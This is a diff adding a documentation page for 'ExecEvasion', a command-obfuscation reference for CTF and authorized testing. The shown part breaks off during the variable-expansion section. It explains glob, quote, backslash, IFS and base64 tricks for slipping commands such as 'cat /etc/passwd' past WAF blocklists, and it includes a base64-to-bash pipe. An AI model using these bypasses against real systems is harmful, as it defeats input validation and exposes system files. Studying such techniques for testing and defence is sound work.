@@ -1,0 +1,1784 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Documentation | ExecEvasion - Command Obfuscation Reference</title>
+    <meta name="description" content="Complete technical documentation for ExecEvasion command obfuscation techniques. Learn how and why each bypass method works for CTF and security testing.">
+    <meta name="keywords" content="command obfuscation, bypass techniques, CTF, penetration testing, security, WAF bypass, shell escaping">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #0d0d0d;
+            --bg-tertiary: #111111;
+            --bg-card: #141414;
+            --cyber-green: #00ff41;
+            --cyber-green-dim: #00cc33;
+            --cyber-green-glow: rgba(0, 255, 65, 0.5);
+            --cyber-green-subtle: rgba(0, 255, 65, 0.1);
+            --neon-pink: #ff0080;
+            --neon-blue: #00d4ff;
+            --text-primary: #e0e0e0;
+            --text-secondary: #888888;
+            --text-bright: #ffffff;
+            --border-color: rgba(0, 255, 65, 0.15);
+            --border-glow: rgba(0, 255, 65, 0.3);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        /* Grid Background */
+        .bg-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background-image:
+                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+        }
+
+        /* Navigation */
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            padding: 1rem 2rem;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .nav-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-family: 'Orbitron', monospace;
+            font-size: 1.5rem;
+            font-weight: 800;
+            text-decoration: none;
+            color: var(--cyber-green);
+            text-shadow: 0 0 20px var(--cyber-green-glow);
+            letter-spacing: 2px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--cyber-green), var(--cyber-green-dim));
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.25rem;
+            box-shadow: 0 0 20px var(--cyber-green-glow);
+            animation: pulse-glow 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-glow {
+            0%, 100% { box-shadow: 0 0 20px var(--cyber-green-glow); }
+            50% { box-shadow: 0 0 35px var(--cyber-green-glow), 0 0 50px var(--cyber-green-subtle); }
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 0.5rem;
+            align-items: center;
+        }
+
+        .nav-link {
+            padding: 0.6rem 1.25rem;
+            border-radius: 6px;
+            text-decoration: none;
+            color: var(--text-secondary);
+            font-weight: 500;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+            border: 1px solid transparent;
+        }
+
+        .nav-link:hover {
+            color: var(--cyber-green);
+            background: var(--cyber-green-subtle);
+            border-color: var(--border-color);
+        }
+
+        .nav-link.active {
+            background: var(--cyber-green);
+            color: var(--bg-primary);
+            font-weight: 600;
+            box-shadow: 0 0 20px var(--cyber-green-glow);
+        }
+
+        .github-star {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            background: transparent;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.85rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            margin-left: 1rem;
+        }
+
+        .github-star:hover {
+            border-color: var(--cyber-green);
+            color: var(--cyber-green);
+            background: var(--cyber-green-subtle);
+            box-shadow: 0 0 15px var(--cyber-green-glow);
+        }
+
+        .github-star svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* Main Layout */
+        .page-layout {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding-top: 5rem;
+            min-height: 100vh;
+        }
+
+        @media (max-width: 900px) {
+            .page-layout {
+                grid-template-columns: 1fr;
+            }
+            .sidebar {
+                display: none;
+            }
+        }
+
+        /* Sidebar */
+        .sidebar {
+            position: sticky;
+            top: 5rem;
+            height: calc(100vh - 5rem);
+            padding: 2rem 1.5rem;
+            border-right: 1px solid var(--border-color);
+            overflow-y: auto;
+            background: rgba(10, 10, 10, 0.5);
+        }
+
+        .sidebar-section {
+            margin-bottom: 2rem;
+        }
+
+        .sidebar-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.15em;
+            color: var(--cyber-green);
+            margin-bottom: 0.75rem;
+            padding-left: 0.5rem;
+            text-shadow: 0 0 10px var(--cyber-green-glow);
+        }
+
+        .sidebar-nav {
+            list-style: none;
+        }
+
+        .sidebar-nav li {
+            margin-bottom: 0.25rem;
+        }
+
+        .sidebar-nav a {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.6rem 0.75rem;
+            border-radius: 6px;
+            text-decoration: none;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            transition: all 0.2s ease;
+            border: 1px solid transparent;
+        }
+
+        .sidebar-nav a:hover {
+            color: var(--cyber-green);
+            background: var(--cyber-green-subtle);
+            border-color: var(--border-color);
+        }
+
+        .sidebar-nav a.active {
+            color: var(--cyber-green);
+            background: var(--cyber-green-subtle);
+            border-color: var(--border-glow);
+            text-shadow: 0 0 10px var(--cyber-green-glow);
+        }
+
+        .nav-icon {
+            font-size: 0.9rem;
+            width: 20px;
+            text-align: center;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        /* Content */
+        .content {
+            padding: 2rem 3rem 4rem;
+            max-width: 900px;
+        }
+
+        .page-header {
+            margin-bottom: 3rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .page-header h1 {
+            font-family: 'Orbitron', monospace;
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            color: var(--cyber-green);
+            text-shadow: 0 0 30px var(--cyber-green-glow);
+            letter-spacing: 3px;
+        }
+
+        .page-header p {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            line-height: 1.8;
+        }
+
+        /* Sections */
+        .doc-section {
+            margin-bottom: 4rem;
+            scroll-margin-top: 6rem;
+        }
+
+        .doc-section h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: var(--text-bright);
+            letter-spacing: 1px;
+        }
+
+        .section-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.25rem;
+        }
+
+        .section-icon.linux {
+            background: var(--cyber-green-subtle);
+            border: 1px solid var(--border-color);
+            color: var(--cyber-green);
+        }
+        .section-icon.windows {
+            background: rgba(0, 212, 255, 0.1);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            color: var(--neon-blue);
+        }
+        .section-icon.theory {
+            background: var(--cyber-green-subtle);
+            border: 1px solid var(--border-color);
+            color: var(--cyber-green);
+        }
+        .section-icon.warning {
+            background: rgba(255, 0, 128, 0.1);
+            border: 1px solid rgba(255, 0, 128, 0.2);
+            color: var(--neon-pink);
+        }
+
+        .doc-section > p {
+            color: var(--text-secondary);
+            margin-bottom: 1.5rem;
+            font-size: 1rem;
+            line-height: 1.8;
+        }
+
+        /* Technique Cards */
+        .technique-card {
+            background: var(--bg-card);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 1.5rem;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .technique-card:hover {
+            border-color: var(--border-glow);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
+        }
+
+        .technique-header {
+            padding: 1.25rem 1.5rem;
+            background: rgba(0, 255, 65, 0.03);
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .technique-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 1rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: var(--text-bright);
+            letter-spacing: 1px;
+        }
+
+        .technique-title .icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+            background: linear-gradient(135deg, var(--cyber-green), var(--cyber-green-dim));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+            color: var(--bg-primary);
+            font-weight: 700;
+            box-shadow: 0 0 15px var(--cyber-green-glow);
+        }
+
+        .technique-tags {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .tag {
+            padding: 0.3rem 0.7rem;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.65rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .tag.shell {
+            background: var(--cyber-green-subtle);
+            color: var(--cyber-green);
+            border: 1px solid var(--border-color);
+        }
+        .tag.encoding {
+            background: rgba(255, 0, 128, 0.1);
+            color: var(--neon-pink);
+            border: 1px solid rgba(255, 0, 128, 0.2);
+        }
+        .tag.cmd {
+            background: rgba(0, 212, 255, 0.1);
+            color: var(--neon-blue);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+        }
+        .tag.powershell {
+            background: rgba(0, 212, 255, 0.1);
+            color: var(--neon-blue);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+        }
+
+        .technique-body {
+            padding: 1.5rem;
+        }
+
+        .technique-body h4 {
+            font-family: 'Orbitron', monospace;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--cyber-green);
+            margin-bottom: 0.75rem;
+            margin-top: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            text-shadow: 0 0 10px var(--cyber-green-glow);
+        }
+
+        .technique-body h4:first-child {
+            margin-top: 0;
+        }
+
+        .technique-body p {
+            color: var(--text-secondary);
+            margin-bottom: 1rem;
+            font-size: 0.95rem;
+            line-height: 1.8;
+        }
+
+        .technique-body ul {
+            margin-bottom: 1.25rem;
+            padding-left: 1.25rem;
+        }
+
+        .technique-body li {
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+            line-height: 1.7;
+        }
+
+        .technique-body li strong {
+            color: var(--text-primary);
+        }
+
+        /* Code Blocks */
+        .code-block {
+            background: var(--bg-secondary);
+            border-radius: 8px;
+            padding: 1.25rem 1.5rem;
+            margin-bottom: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            overflow-x: auto;
+            border: 1px solid var(--border-color);
+            line-height: 2;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .code-block .comment {
+            color: #555555;
+        }
+
+        .code-block .command {
+            color: var(--cyber-green);
+        }
+
+        .code-block .string {
+            color: var(--neon-pink);
+        }
+
+        .code-block .variable {
+            color: var(--neon-blue);
+        }
+
+        .code-example {
+            margin-bottom: 1.5rem;
+        }
+
+        .code-example-label {
+            font-family: 'Orbitron', monospace;
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .inline-code {
+            background: var(--bg-secondary);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            color: var(--cyber-green);
+            border: 1px solid var(--border-color);
+        }
+
+        /* Info Boxes */
+        .info-box {
+            padding: 1.25rem 1.5rem;
+            border-radius: 10px;
+            margin-bottom: 1.5rem;
+            display: flex;
+            gap: 1rem;
+        }
+
+        .info-box.tip {
+            background: var(--cyber-green-subtle);
+            border: 1px solid var(--border-color);
+        }
+
+        .info-box.warning {
+            background: rgba(255, 0, 128, 0.05);
+            border: 1px solid rgba(255, 0, 128, 0.2);
+        }
+
+        .info-box.note {
+            background: rgba(0, 212, 255, 0.05);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+        }
+
+        .info-box-icon {
+            font-size: 1.5rem;
+            flex-shrink: 0;
+        }
+
+        .info-box-content h4 {
+            font-family: 'Orbitron', monospace;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            letter-spacing: 0.05em;
+        }
+
+        .info-box.tip h4 { color: var(--cyber-green); }
+        .info-box.warning h4 { color: var(--neon-pink); }
+        .info-box.note h4 { color: var(--neon-blue); }
+
+        .info-box-content p {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin: 0;
+            line-height: 1.7;
+        }
+
+        /* Tables */
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+        }
+
+        .comparison-table th,
+        .comparison-table td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .comparison-table th {
+            background: var(--bg-secondary);
+            font-family: 'Orbitron', monospace;
+            font-weight: 600;
+            color: var(--cyber-green);
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .comparison-table td {
+            color: var(--text-secondary);
+        }
+
+        .comparison-table tr:hover td {
+            background: var(--cyber-green-subtle);
+        }
+
+        .status-yes {
+            color: var(--cyber-green);
+            font-weight: 600;
+        }
+
+        .status-no {
+            color: var(--neon-pink);
+            font-weight: 600;
+        }
+
+        .status-partial {
+            color: var(--neon-blue);
+            font-weight: 600;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 3rem 2rem;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            border-top: 1px solid var(--border-color);
+            background: rgba(10, 10, 10, 0.5);
+        }
+
+        footer a {
+            color: var(--cyber-green);
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        footer a:hover {
+            text-shadow: 0 0 10px var(--cyber-green-glow);
+        }
+
+        .footer-heart {
+            display: inline-block;
+            color: var(--neon-pink);
+            animation: heartbeat 1.5s ease-in-out infinite;
+        }
+
+        @keyframes heartbeat {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+
+        .footer-github {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            background: transparent;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+            margin-top: 0.75rem;
+        }
+
+        .footer-github:hover {
+            border-color: var(--cyber-green);
+            box-shadow: 0 0 15px var(--cyber-green-glow);
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-secondary);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 3px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--cyber-green-dim);
+        }
+
+        /* Animations */
+        .fade-in {
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Glowing text effect */
+        .glow-text {
+            text-shadow: 0 0 10px var(--cyber-green-glow), 0 0 20px var(--cyber-green-glow);
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-grid"></div>
+
+    <nav>
+        <div class="nav-content">
+            <a href="index.html" class="logo" style="text-shadow: none; letter-spacing: 0.05em;">
+                <div class="logo-icon">&gt;_</div>
+                <span><span style="color: var(--cyber-green);">Exec</span><span style="color: var(--text-primary);">Evasion</span></span>
+            </a>
+            <div class="nav-links">
+                <a href="index.html" class="nav-link">Generator</a>
+                <a href="docs.html" class="nav-link active">Documentation</a>
+                <a href="https://github.com/dr34mhacks/ExecEvasion" target="_blank" rel="noopener noreferrer" class="github-star">
+                    <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
+                    Star
+                </a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="page-layout">
+        <aside class="sidebar">
+            <div class="sidebar-section">
+                <div class="sidebar-title">Getting Started</div>
+                <ul class="sidebar-nav">
+                    <li><a href="#introduction"><span class="nav-icon">></span> Introduction</a></li>
+                    <li><a href="#how-it-works"><span class="nav-icon">></span> How It Works</a></li>
+                    <li><a href="#when-to-use"><span class="nav-icon">></span> When to Use</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title">Linux/Unix</div>
+                <ul class="sidebar-nav">
+                    <li><a href="#glob-patterns"><span class="nav-icon">[]</span> Glob Patterns</a></li>
+                    <li><a href="#quote-insertion"><span class="nav-icon">""</span> Quote Insertion</a></li>
+                    <li><a href="#backslash-escape"><span class="nav-icon">\</span> Backslash Escape</a></li>
+                    <li><a href="#variable-expansion"><span class="nav-icon">$</span> Variable Expansion</a></li>
+                    <li><a href="#concatenation"><span class="nav-icon">+</span> Concatenation</a></li>
+                    <li><a href="#encoding"><span class="nav-icon">B</span> Encoding</a></li>
+                    <li><a href="#wildcards"><span class="nav-icon">*</span> Wildcards</a></li>
+                    <li><a href="#ifs"><span class="nav-icon">_</span> IFS Manipulation</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title">Windows</div>
+                <ul class="sidebar-nav">
+                    <li><a href="#caret-escape"><span class="nav-icon">^</span> Caret Escape</a></li>
+                    <li><a href="#env-substring"><span class="nav-icon">%</span> Env Substrings</a></li>
+                    <li><a href="#powershell"><span class="nav-icon">PS</span> PowerShell</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title">Reference</div>
+                <ul class="sidebar-nav">
+                    <li><a href="#comparison"><span class="nav-icon">#</span> Comparison Table</a></li>
+                    <li><a href="#troubleshooting"><span class="nav-icon">!</span> Troubleshooting</a></li>
+                    <li><a href="#quick-reference"><span class="nav-icon">@</span> Cheatsheet</a></li>
+                </ul>
+            </div>
+        </aside>
+
+        <main class="content">
+            <div class="page-header fade-in">
+                <h1>DOCUMENTATION</h1>
+                <p>Learn why command obfuscation techniques work and when to use them effectively in CTF challenges and authorized security testing.</p>
+            </div>
+
+            <!-- Introduction -->
+            <section id="introduction" class="doc-section fade-in">
+                <h2>
+                    <span class="section-icon theory">></span>
+                    Introduction
+                </h2>
+                <p>
+                    Command obfuscation is the practice of modifying commands while preserving their functionality to bypass security filters, Web Application Firewalls (WAFs), and input validation mechanisms. This is commonly needed in:
+                </p>
+                <ul>
+                    <li><strong>CTF Competitions</strong> - Bypassing intentionally weak filters in challenges</li>
+                    <li><strong>Penetration Testing</strong> - Testing the effectiveness of security controls</li>
+                    <li><strong>Security Research</strong> - Understanding filter bypass techniques</li>
+                    <li><strong>Red Team Operations</strong> - Evading detection during authorized assessments</li>
+                </ul>
+
+                <div class="info-box warning">
+                    <span class="info-box-icon">&#9888;</span>
+                    <div class="info-box-content">
+                        <h4>Legal Disclaimer</h4>
+                        <p>These techniques should only be used in authorized security testing environments, CTF competitions, or educational contexts. Unauthorized access to computer systems is illegal.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- How It Works -->
+            <section id="how-it-works" class="doc-section">
+                <h2>
+                    <span class="section-icon theory">></span>
+                    How It Works
+                </h2>
+                <p>
+                    Command obfuscation exploits the difference between how security filters parse input and how the shell interprets commands. Filters often use simple pattern matching (regex, blacklists) while shells have complex parsing rules.
+                </p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">?</span>
+                            The Filter vs Shell Gap
+                        </span>
+                    </div>
+                    <div class="technique-body">
+                        <h4>How Filters Typically Work</h4>
+                        <ul>
+                            <li><strong>Blacklist matching</strong> - Block known dangerous commands like <span class="inline-code">cat</span>, <span class="inline-code">wget</span>, <span class="inline-code">curl</span></li>
+                            <li><strong>Regex patterns</strong> - Match patterns like <span class="inline-code">/etc/passwd</span></li>
+                            <li><strong>Character filtering</strong> - Remove or block special characters</li>
+                        </ul>
+
+                        <h4>How Shells Actually Parse</h4>
+                        <ul>
+                            <li><strong>Quote removal</strong> - Empty quotes <span class="inline-code">""</span> and <span class="inline-code">''</span> are removed</li>
+                            <li><strong>Variable expansion</strong> - <span class="inline-code">$var</span> is replaced with its value</li>
+                            <li><strong>Glob expansion</strong> - <span class="inline-code">[a]</span> matches the character 'a'</li>
+                            <li><strong>Escape processing</strong> - <span class="inline-code">\c</span> becomes just 'c'</li>
+                        </ul>
+
+                        <div class="code-example">
+                            <div class="code-example-label">Example: Filter sees vs Shell executes</div>
+                            <div class="code-block"><span class="comment"># What the filter sees:</span>
+c''a''t /e''tc/p''asswd
+
+<span class="comment"># What the shell executes after quote removal:</span>
+<span class="command">cat</span> /etc/passwd</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- When to Use -->
+            <section id="when-to-use" class="doc-section">
+                <h2>
+                    <span class="section-icon theory">></span>
+                    When to Use Each Technique
+                </h2>
+
+                <div class="info-box tip">
+                    <span class="info-box-icon">&#128161;</span>
+                    <div class="info-box-content">
+                        <h4>Pro Tip</h4>
+                        <p>Different filters block different things. Start with simple techniques (quotes, backslashes) and escalate to encoding if needed. The simplest bypass that works is usually the best.</p>
+                    </div>
+                </div>
+
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>If Blocked...</th>
+                            <th>Try This Technique</th>
+                            <th>Example</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Command names (cat, ls, id)</td>
+                            <td>Quotes, Backslash, Glob</td>
+                            <td><span class="inline-code">c'a't</span>, <span class="inline-code">c\at</span>, <span class="inline-code">c[a]t</span></td>
+                        </tr>
+                        <tr>
+                            <td>File paths (/etc/passwd)</td>
+                            <td>Wildcards, Glob, Encoding</td>
+                            <td><span class="inline-code">/e*/passwd</span>, <span class="inline-code">/etc/pass[w]d</span></td>
+                        </tr>
+                        <tr>
+                            <td>Spaces</td>
+                            <td>IFS, Brace expansion, Tabs</td>
+                            <td><span class="inline-code">cat${IFS}/etc/passwd</span></td>
+                        </tr>
+                        <tr>
+                            <td>Entire command string</td>
+                            <td>Base64, Hex, Concatenation</td>
+                            <td><span class="inline-code">echo Y2F0...|base64 -d|bash</span></td>
+                        </tr>
+                        <tr>
+                            <td>Special characters</td>
+                            <td>Variable expansion, Encoding</td>
+                            <td><span class="inline-code">$'\x63\x61\x74'</span></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- LINUX TECHNIQUES -->
+
+            <!-- Glob Patterns -->
+            <section id="glob-patterns" class="doc-section">
+                <h2>
+                    <span class="section-icon linux">></span>
+                    Glob Patterns
+                </h2>
+                <p>Glob patterns are shell wildcards used for filename matching. When used strategically, they can bypass string-based filters while the shell still correctly interprets the command.</p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">[]</span>
+                            Character Class Matching
+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag shell">Shell</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Why It Works</h4>
+                        <p>The bracket expression <span class="inline-code">[x]</span> matches exactly one character from the set inside the brackets. When there's only one character, it matches exactly that character. Filters see <span class="inline-code">[a]</span> but bash resolves it to <span class="inline-code">a</span>.</p>
+
+                        <h4>Syntax Variants</h4>
+                        <div class="code-block"><span class="comment"># Single character class - matches exactly that character</span>
+<span class="command">c[a]t</span> /etc/passwd     <span class="comment"># Executes: cat /etc/passwd</span>
+
+<span class="comment"># Multiple positions</span>
+<span class="command">[c]at</span> /etc/pass[w]d  <span class="comment"># Executes: cat /etc/passwd</span>
+
+<span class="comment"># Works in paths too</span>
+cat /[e]tc/passwd     <span class="comment"># Executes: cat /etc/passwd</span></div>
+
+                        <h4>When It Works</h4>
+                        <ul>
+                            <li>Filter blocks exact strings like "cat" or "passwd"</li>
+                            <li>Filter doesn't understand shell glob syntax</li>
+                            <li>bash, sh, zsh, and most POSIX shells</li>
+                        </ul>
+
+                        <h4>When It Fails</h4>
+                        <ul>
+                            <li>Filter strips or blocks bracket characters</li>
+                            <li>Command runs in a context without glob expansion</li>
+                            <li>The glob doesn't match any existing file (for path globs)</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Quote Insertion -->
+            <section id="quote-insertion" class="doc-section">
+                <h2>
+                    <span class="section-icon linux">></span>
+                    Quote Insertion
+                </h2>
+                <p>Inserting empty quote pairs breaks up blocked strings while the shell removes them during parsing, resulting in the original command.</p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">""</span>
+                            Empty Quotes
+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag shell">Shell</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Why It Works</h4>
+                        <p>In shell parsing, adjacent strings are concatenated. Empty quotes <span class="inline-code">""</span> or <span class="inline-code">''</span> produce empty strings that don't change the final result. The filter sees broken strings but the shell concatenates them.</p>
+
+                        <div class="code-block"><span class="comment"># Single quotes (no expansion inside)</span>
+c''a''t /etc/passwd      <span class="comment"># Shell sees: c + '' + a + '' + t = cat</span>
+
+<span class="comment"># Double quotes (allows expansion inside, but empty = empty)</span>
+c""a""t /etc/passwd      <span class="comment"># Same result</span>
+
+<span class="comment"># Mixed quotes</span>
+c'a't /e"tc"/passwd      <span class="comment"># Works the same way</span>
+
+<span class="comment"># Strategic placement to break keywords</span>
+ca''t /et''c/pa''sswd    <span class="comment"># Breaks up "cat", "etc", "passwd"</span></div>
+
+                        <h4>Single vs Double Quotes</h4>
+                        <ul>
+                            <li><strong>Single quotes ''</strong> - No expansion, everything literal (safer)</li>
+                            <li><strong>Double quotes ""</strong> - Allows variable expansion ($VAR works inside)</li>
+                            <li><strong>Best practice</strong> - Use single quotes when possible</li>
+                        </ul>
+
+                        <div class="info-box note">
+                            <span class="info-box-icon">&#128218;</span>
+                            <div class="info-box-content">
+                                <h4>Shell Concatenation Rule</h4>
+                                <p>Adjacent words in shell are concatenated: <span class="inline-code">"hel""lo"</span> becomes <span class="inline-code">hello</span>. This is documented POSIX behavior.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Backslash Escape -->
+            <section id="backslash-escape" class="doc-section">
+                <h2>
+                    <span class="section-icon linux">></span>
+                    Backslash Escape
+                </h2>
+                <p>Backslash escapes the following character, preserving its literal value. For most alphanumeric characters, this has no effect but breaks pattern matching.</p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">\</span>
+                            Character Escaping
+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag shell">Shell</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Why It Works</h4>
+                        <p>Backslash makes the next character literal. For regular letters, <span class="inline-code">\c</span> equals <span class="inline-code">c</span>. Filters see the backslash but bash strips it during quote removal phase.</p>
+
+                        <div class="code-block"><span class="comment"># Escape every letter</span>
+\c\a\t /\e\t\c/\p\a\s\s\w\d
+
+<span class="comment"># Just escape command name</span>
+\c\a\t /etc/passwd
+
+<span class="comment"># Mix with paths</span>
+cat /etc\/passwd         <span class="comment"># Escaping / has no effect</span></div>
+
+                        <h4>Important Notes</h4>
+                        <ul>
+                            <li>Works for letters: <span class="inline-code">\a</span> = <span class="inline-code">a</span></li>
+                            <li>Special chars stay escaped: <span class="inline-code">\$</span> = literal $</li>
+                            <li>Newline after backslash = line continuation</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Variable Expansion -->
+            <section id="variable-expansion" class="doc-section">
+                <h2>
+                    <span class="section-icon linux">></span>
+                    Variable Expansion
+                </h2>
+                <p>Shell variables that are undefined or empty expand to nothing. Inserting these between characters breaks the string for filters but produces the same output.</p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">$</span>
+                            Empty Variable Insertion
